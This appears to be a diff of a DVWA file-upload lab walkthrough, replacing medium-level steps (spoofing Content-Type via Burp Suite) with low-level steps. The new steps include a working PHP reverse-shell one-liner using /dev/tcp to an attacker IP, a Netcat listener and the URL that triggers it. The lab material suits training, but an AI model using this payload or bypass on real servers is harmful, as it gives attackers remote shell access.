@@ -1,47 +1,29 @@
-📤 File Upload – Medium Security Level
+📤 File Upload – Low Security Level
 
-### 🛠️ Objective:
-Bypass a simple content-type check to upload a PHP shell.
+🛠️ Objective:
+Upload a PHP web shell to gain remote code execution.
 
----
+🧭 Walkthrough
+Create a PHP reverse shell file with the following content:
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.1/1234 0>&1'"); ?>
+📌 Replace 192.168.1.1 with your machine’s IP address.
 
-### 🔍 Observations
+Save the file as:
+shell.php
+Upload the file using the DVWA form.
+✅ If successful, DVWA will show you the file path like:
 
-- Uploading a `.php` file directly returns an error.
-- Source code shows a check on the **MIME type** (`uploaded_type`), expecting an image type like `image/jpeg` or `image/png`.
-
----
-
-### 🧭 Exploitation Steps with Burp Suite
-
-1. Intercept the file upload request using **Burp Suite**.
-2. Locate the `Content-Type` header (e.g., `application/x-php`) and change it to:
-````
-
-Content-Type: image/png
-
-````
-
-3. Forward the modified request.
-
-✅ The server will accept the file, bypassing the type check.
-
-4. Start a Netcat listener:
-```bash
+hackable/uploads/shell.php
+In your terminal, start a Netcat listener:
 nc -lnvp 1234
-````
+Open a new browser tab and access the uploaded PHP file:
+http://127.0.0.1/DVWA/hackable/uploads/shell.php
+🎯 This will trigger the reverse shell.
 
-5. Visit the uploaded shell path in the browser to trigger the reverse shell.
-
----
-
-### 🧩 Summary
-
-* ⚠️ MIME type filtering in place
-* ❌ No check on actual file content or extension behavior
-* ✅ Still exploitable with header manipulation
-
-## ✅ Status
-
-* ⚠️ Exploitable with tools like Burp
-* 🟡 Intermediate level
+🧩 Summary
+✅ No extension or MIME type check
+✅ PHP is executable on upload
+❌ No sanitization or validation
+✅ Status
+✅ Fully exploitable
+🟢 Beginner-friendly
